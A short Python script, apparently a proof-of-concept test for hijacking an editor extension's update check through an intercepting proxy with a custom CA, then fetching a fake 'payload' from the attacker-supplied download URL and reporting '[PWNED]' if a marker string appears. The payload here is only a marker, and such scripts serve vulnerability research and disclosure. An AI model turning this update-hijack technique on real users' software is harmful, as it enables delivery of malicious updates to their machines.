
import requests
import json
import time

proxies = {
    "https": "http://localhost:8081" 
}

# 1. Simulate the Update Check
update_url = "https://open-vsx.org/vscode/gallery/extension/google/antigravity"
print(f"[*] Checking for updates at {update_url}...")

try:
    resp = requests.get(update_url, proxies=proxies, verify="mitm_ca.pem")
    print(f"[*] Response Status: {resp.status_code}")
    print(f"[*] Response Body: {resp.text}")
    
    data = resp.json()
    if data.get("version") == "99.9.9":
        print("\n[SUCCESS] Update Hijacked! Fake version 99.9.9 detected.")
        
        download_url = data["files"]["download"]
        print(f"[*] Attempting to download payload from: {download_url}")
        
        # 2. Simulate the Download
        # Note: In real MITM, the target host in URL matches the hijacked host
        dl_resp = requests.get(download_url, proxies=proxies, verify="mitm_ca.pem")
        print(f"[*] Download Status: {dl_resp.status_code}")
        print(f"[*] Payload Content: {dl_resp.content}")
        
        if b"SYSTEM COMPROMISED" in dl_resp.content:
            print("\n[PWNED] Malicious Payload Successfully Downloaded via Update Mechanism!")
        else:
            print("\n[FAIL] Payload download failed or content mismatch.")
            
    else:
        print("\n[FAIL] Update check returned normal response (not hijacked).")

except Exception as e:
    print(f"\n[FAIL] Error: {e}")
